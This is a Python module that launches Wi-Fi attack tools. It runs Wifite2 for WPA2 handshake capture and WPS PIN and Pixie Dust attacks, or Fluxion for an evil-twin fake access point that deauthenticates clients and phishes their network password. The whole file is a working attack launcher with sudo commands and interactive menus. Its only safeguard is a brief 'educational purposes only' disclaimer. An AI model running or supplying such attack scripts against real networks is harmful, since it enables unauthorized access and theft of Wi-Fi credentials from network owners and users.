# modules/automated_wifi_attack.py

import subprocess
import shutil # For shutil.which to check if a command exists
import sys

# --- Configuration ---
# You might want to make these configurable if you use this script in a larger project
# For example, reading from a config file or environment variables.
WIFITE_COMMAND = "wifite2"
FLUXION_COMMAND = "fluxion"
# ---------------------

def is_tool_installed(name):
    """Check whether `name` is on PATH and marked as executable."""
    if shutil.which(name) is None:
        print(f"[!] Error: '{name}' command not found. Please install it first.")
        return False
    return True

def run_automated_attack(interface):
    """
    Starts the Wifite2 automated Wi-Fi attack suite.
    Targets WPA2 with WPS and attempts to capture handshakes.
    """
    print(f"[*] Preparing to start Wifite2 automated attack on {interface}...")

    if not is_tool_installed(WIFITE_COMMAND):
        return False # Indicate failure

    # Command to run Wifite2
    # --attack wpa2: Focus on WPA2 networks (most common for handshakes)
    # --wps: Include WPS attacks (Pixie Dust, PIN brute-force)
    # --handshake: Specifically try to capture WPA handshakes
    # --kill: Kill interfering processes (NetworkManager, wpa_supplicant). Use with caution.
    #         Consider adding this if you frequently have issues with interference.
    command = [
        "sudo", WIFITE_COMMAND,
        "--interface", interface,
        "--attack", "wpa2",
        "--wps",
        "--handshake"
        # Optional: "--kill" # if you need to kill interfering processes
    ]

    print(f"[+] Executing: {' '.join(command)}")
    print(f"[+] Wifite2 will now take over. Follow its on-screen instructions.")
    print(f"[+] Press Ctrl+C in the Wifite2 window to stop it.")

    try:
        # For interactive tools like wifite2, we usually don't capture output,
        # as the tool itself handles the user interaction.
        # `check=True` would raise CalledProcessError if wifite2 exits with non-zero.
        # For interactive tools, a non-zero exit (e.g., user Ctrl+C) is common,
        # so we might not want to use `check=True` or handle it gracefully.
        process = subprocess.Popen(command)
        process.wait() # Wait for the process to complete

        if process.returncode == 0:
            print(f"[+] Wifite2 attack completed or exited successfully on {interface}.")
            return True
        else:
            print(f"[-] Wifite2 exited with code {process.returncode} on {interface}.")
            return False
    except FileNotFoundError:
        print(f"[!] Error: 'sudo' or '{WIFITE_COMMAND}' not found. Ensure they are installed and in your PATH.")
        return False
    except KeyboardInterrupt:
        print(f"\n[!] Wifite2 attack interrupted by user on {interface}.")
        # The subprocess might still be running if Popen was used and not properly terminated.
        # Popen().wait() handles this, but if you were to manage it directly:
        # if 'process' in locals() and process.poll() is None:
        #     process.terminate()
        #     process.wait()
        return False
    except Exception as e:
        print(f"[!] An unexpected error occurred while running Wifite2: {e}")
        return False

def run_fluxion_attack(interface):
    """
    Starts the Fluxion social engineering Wi-Fi attack.
    Typically involves creating a Fake AP and deauthenticating clients.
    """
    print(f"[*] Preparing to start Fluxion attack on {interface}...")

    if not is_tool_installed(FLUXION_COMMAND):
        return False # Indicate failure

    # Command to run Fluxion
    # --interface: Specifies the wireless interface
    # --fakeap: Implies using a Fake Access Point attack (Fluxion's core)
    # --deauth: Often used in conjunction with FakeAP to force clients to disconnect
    #           and potentially connect to the evil twin. Fluxion itself might
    #           manage deauth internally based on the attack chosen.
    # Note: Fluxion is highly interactive. These flags might just set initial parameters,
    #       and the user will be prompted for more choices within Fluxion.
    #       A common way to start fluxion is just `sudo fluxion` and let it guide you.
    #       For scripting, you might need more specific, non-interactive options if available,
    #       or expect user interaction.
    command = [
        "sudo", FLUXION_COMMAND,
        "--interface", interface
        # Fluxion is very interactive, so specific flags like --fakeap and --deauth
        # might be handled internally after launch.
        # Launching with just the interface is often enough to get into its menu.
        # If Fluxion supports more direct non-interactive flags for specific attacks, use them.
    ]

    print(f"[+] Executing: {' '.join(command)}")
    print(f"[+] Fluxion will now take over. Follow its on-screen instructions.")
    print(f"[+] Press Ctrl+C in the Fluxion window (or follow its exit instructions) to stop it.")

    try:
        process = subprocess.Popen(command)
        process.wait()

        if process.returncode == 0:
            print(f"[+] Fluxion attack completed or exited successfully on {interface}.")
            return True
        else:
            print(f"[-] Fluxion exited with code {process.returncode} on {interface}.")
            return False
    except FileNotFoundError:
        print(f"[!] Error: 'sudo' or '{FLUXION_COMMAND}' not found. Ensure they are installed and in your PATH.")
        return False
    except KeyboardInterrupt:
        print(f"\n[!] Fluxion attack interrupted by user on {interface}.")
        return False
    except Exception as e:
        print(f"[!] An unexpected error occurred while running Fluxion: {e}")
        return False

# --- Main execution for demonstration ---
if __name__ == "__main__":
    print("Wi-Fi Attack Script")
    print("===================")
    print("Disclaimer: This script is for educational purposes only.")
    print("Ensure you have explicit permission before testing on any network.")
    print("Unauthorized access to computer systems is illegal.")
    print("===================\n")

    # Get wireless interface from user
    # In a real scenario, you might want to list available wireless interfaces
    # that support monitor mode. For simplicity, we'll ask.
    try:
        selected_interface = input("Enter the wireless interface (e.g., wlan0mon, wlan1): ").strip()
        if not selected_interface:
            print("[!] No interface provided. Exiting.")
            sys.exit(1)

        print("\nChoose an attack type:")
        print("1. Wifite2 (Automated WPA/WPA2, WPS, Handshake capture)")
        print("2. Fluxion (Social Engineering, Fake AP)")
        choice = input("Enter your choice (1 or 2): ")

        if choice == '1':
            print(f"\nAttempting to start Wifite2 on {selected_interface}...")
            # You would typically ensure the interface is in monitor mode before passing it.
            # Tools like airmon-ng can be used: `sudo airmon-ng start <interface_name>`
            # Wifite2 might also try to put it into monitor mode.
            print(f"[INFO] Ensure '{selected_interface}' is in monitor mode or Wifite2 can enable it.")
            run_automated_attack(selected_interface)
        elif choice == '2':
            print(f"\nAttempting to start Fluxion on {selected_interface}...")
            print(f"[INFO] Ensure '{selected_interface}' is in monitor mode or Fluxion can enable it.")
            run_fluxion_attack(selected_interface)
        else:
            print("[!] Invalid choice. Exiting.")

    except KeyboardInterrupt:
        print("\n[!] Script interrupted by user. Exiting.")
    except Exception as e:
        print(f"\n[!] A critical error occurred in the script: {e}")
    finally:
        print("\n[*] Script finished.")